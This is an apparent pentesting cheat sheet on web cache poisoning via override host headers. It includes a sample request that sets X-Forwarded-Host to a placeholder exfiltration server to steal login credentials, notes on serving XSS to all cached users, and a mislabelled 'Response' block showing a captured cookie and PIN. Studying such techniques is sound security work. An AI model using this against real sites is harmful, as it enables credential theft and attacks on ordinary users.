**Webcache poison via HOST Headers**
This attack happens when we can poison the web-cache key via Override host headers.  Usually the **HostHeader=KEYED** in most of nowadays web-cache as it is used to form the request structure to be cached and almost never can be poisoned... But if the backend supports Ovverride headers we might use those to poison the webcache!

What can be performed?
1)Since the web application uses our malicious input for a JavaScript import, we could point it to a server under our control, host a script file, and execute an XSS attack against all users that get served the poisoned cache
2)Since the web application also uses our malicious input for the action of the login form, we could point it to a server under our control and wait for a user to log in. This would send the login credentials to our server

## Attack Scenario
Let's take as an example where the Host header is used to reflect it's value in a form login function.
To identify if we can inject we might try to add **Override-Headers** to request and see if the reflected values changes in the response body.
This attack could also lead toward  ex-filtrating the login creds towards your exfil server send by the victim.
```
Request:
GET /login.php HTTP/1.1
Host: VALID
X-Forwarded-Host: EXFILSERVER

Response:
/admin/sysinfo_pin
Host: 127.0.0.1:8888
Cookie: sess=a3cfb7a470a9013f2fc4853e224187a6
pin=926402795027
```

TIPS:
1)You might need to test for several Override headers before finding the one that works!
2)You might need to remove Origin,Refer etc headers from base request otherwise will not go thru
